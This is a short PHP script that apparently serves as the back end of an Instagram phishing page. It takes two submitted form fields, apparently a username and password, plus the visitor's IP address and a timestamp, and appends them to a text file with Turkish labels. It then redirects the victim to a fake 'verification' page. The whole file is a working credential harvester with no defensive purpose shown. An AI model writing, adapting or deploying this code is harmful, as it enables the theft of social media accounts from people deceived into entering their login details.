<?php
$instagram1 = $_POST['lol'];
$instagram2 =  $_POST['lol2'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('instagram.txt', 'a'); 
fwrite($file, $instagram1."-----Kullanici adi-----> " .$instagram2. "   Ip Adresi: " .$ip. "   Tarih: " .$cur_time.  "\n\n");
fclose($file); 
echo '';
			header("Refresh:0; url=dogrulama.html");
?>





